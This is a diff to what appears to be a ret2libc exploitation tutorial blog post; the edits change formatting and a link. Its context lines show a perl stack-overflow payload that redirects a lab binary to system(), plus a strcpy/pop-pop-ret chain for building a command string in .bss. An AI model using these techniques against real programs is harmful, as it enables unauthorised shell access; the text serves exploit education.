@@ -132,7 +132,7 @@ gdb-peda$ x/20s 0xffffd7e2
 0xffffd89b:     "LANG=C.UTF-8"
 ...
 ```
-The above results show that the string starts at <code>0xffffd7ec</code>. Nevertheless, running <code>find\_var.c</code>, I got the output <code>0xffffd832</code>. If we type <code>unset environment LINES</code> and <code>unset environment COLUMNS</code> in <code>gdb</code>, the two addresses should be identical.
+The above results show that the string starts at <code>0xffffd7ec</code>. Nevertheless, running <code>find_var.c</code>, I got the output <code>0xffffd832</code>. If we type <code>unset environment LINES</code> and <code>unset environment COLUMNS</code> in <code>gdb</code>, the two addresses should be identical.
 
 ### Assemble the Payload
 
@@ -154,7 +154,7 @@ sh: 1: <???%>: not found
 sh: 1: <???%>: not found
 sh: 1: j: not found
 ```
-Note that the leading two bytes of NOPS in our payload are for four-byte alignment requirement, given that <code>ans_buf</code> has a size of $38$ bytes. The output indicates that <code>&system()</code> does overwrite the return address but the <code>SHELL</code> variable is wrongly positioned. I kept decreasing the value of repeated <code>&system()</code> until:
+Note that the leading two bytes of NOPS in our payload are for four-byte alignment requirement, given that <code>ans_buf</code> has a size of $$38$$ bytes. The output indicates that <code>&system()</code> does overwrite the return address but the <code>SHELL</code> variable is wrongly positioned. I kept decreasing the value of repeated <code>&system()</code> until:
 ```bash
 $ ./ans_check7 $(perl -e 'print "\x90"x2, "\x10\x91\x04\x08"x14, "\xee\x92\x04\x08", "\x32\xd8\xff\xff"')
 sh: 1: /bash: not found
@@ -195,7 +195,7 @@ where:
 If we inject the above instructions properly onto the stack, our vulnerable program will return to the first <code>&strcpy@plt</code> instead of its original return address. And what will happen? The addresses <code>str_loc_1</code> and <code>src_byte_addr_1</code> are arguments for the <code>strcpy</code> libc function. The character stored at <code>src_byte_addr_1</code> will be copied into <code>str_loc_1</code>. The <code>strcpy</code> function will subsequently return to the first <code>&pop-pop-ret</code> sequence, which pops <code>str_loc_1</code> and <code>src_byte_addr_1</code> off the stack and pushes the next instruction (the second <code>&strcpy@plt</code>) onto the stack. In this way, our <i>n</i> <code>strcpy</code> functions are chained together to create an <i>n</i>-byte string starting at <code>str_loc_1</code>. The new payload we are developing is to have the following structure:
 <p id="console">PADDING | build-string-payload | &system() | &exit_path | &cmd_string</p>
 
-We can use the same method shown in [Part I](https://xingjianxuanyuan.github.io/ret2libc/#part-i) to obtain the addresses of <code>system()</code>, <code>exit(0)</code>, <code>strcpy()</code>, and <code>pop-pop-ret</code>. We will next choose an address to serve as our string destination. Our chosen address needs to be stable, readable, and writable, and capable of being safely overwritten. In our example, we will consider the <code>.bss</code> section of the address space. We can find this address with the <code>readelf</code> utility. Execute the following command:
+We can use the same method shown in [Part I](https://xyxj1024.github.io/posts/ret2libc#part-i) to obtain the addresses of <code>system()</code>, <code>exit(0)</code>, <code>strcpy()</code>, and <code>pop-pop-ret</code>. We will next choose an address to serve as our string destination. Our chosen address needs to be stable, readable, and writable, and capable of being safely overwritten. In our example, we will consider the <code>.bss</code> section of the address space. We can find this address with the <code>readelf</code> utility. Execute the following command:
 ```bash
 $ readelf -S ans_check
 There are 36 section headers, starting at offset 0x41f8:
